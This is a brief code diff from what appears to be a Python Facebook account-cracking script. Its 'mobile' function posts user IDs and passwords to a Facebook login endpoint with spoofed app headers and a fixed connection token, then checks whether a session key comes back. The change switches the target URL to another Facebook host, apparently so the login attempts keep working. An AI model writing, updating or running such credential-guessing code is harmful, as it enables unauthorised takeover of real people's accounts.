@@ -1653,7 +1653,7 @@ def mobile(uid,pwx,tl):
             'X-FB-Client-IP': 'True',
             'X-FB-Server-Cluster': 'True',
             'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
-            url = "https://api.facebook.com/auth/login"
+            url = "https://b-graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
@@ -1687,7 +1687,6 @@ def mobile(uid,pwx,tl):
         time.sleep(10)
     except Exception as e:
         pass
-
 
 def freeq(uid,pwx,tl):
     global loop
